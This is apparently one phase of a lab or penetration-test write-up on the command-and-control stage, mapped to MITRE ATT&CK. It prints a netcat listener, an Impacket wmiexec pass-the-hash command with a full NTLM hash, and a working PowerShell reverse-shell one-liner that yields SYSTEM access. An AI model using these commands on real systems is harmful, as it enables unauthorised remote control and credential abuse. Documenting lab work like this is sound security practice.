## Phase 6: Command and Control (TA0011)

**MITRE ATT\&CK Phase:** TA0011 - Command and Control
**Objective:** Maintain persistent access and control over the compromised systems using covert channels and techniques.

---

### 🔧 Step-by-Step Attack Execution:

#### ✅ Step 1: Setting up the listener on Attacker Machine

We prepared to catch a reverse shell connection using Netcat.

```bash
nc -lvnp 4444
```

This starts a listener on port 4444.

---

#### ✅ Step 2: Launching Reverse Shell from Target (Post Exploitation)

We executed the following PowerShell reverse shell one-liner using Impacket's `wmiexec.py` from Phase 3 and Phase 5 context:

```bash
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py CORP/Administrator@192.168.50.5 -hashes aad3b435b51404eeaad3b435b51404ee:68ae965c9062b389f2a285e27ff0a566
```

Once connected to the WMI shell, we used this command:

```powershell
powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.50.10',4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() }; $client.Close()"
```

This established a successful reverse shell on our attacker machine.

---

### 🧠 Result and Verification:

* Successfully received a PowerShell prompt on the attacker's terminal.
* Verified command execution on the target by issuing `whoami`, which returned:

```powershell
nt authority\system
```

This indicates SYSTEM-level access was achieved remotely.

---

### 🔐 MITRE Techniques Used:

* **T1059.001** – PowerShell (for reverse shell execution)
* **T1021.002** – Remote Services: SMB/Windows Admin Shares (used Impacket tools)
* **T1071.001** – Application Layer Protocol: Web Protocols (TCP over reverse shell)
* **T1105** – Ingress Tool Transfer (tools pushed to target)

---

### ✅ Conclusion

In this phase, I maintained persistent access by simulating a reverse shell channel using `wmiexec` and PowerShell TCP client. This completes the Command and Control stage. Screenshots were taken and logs were saved.

---
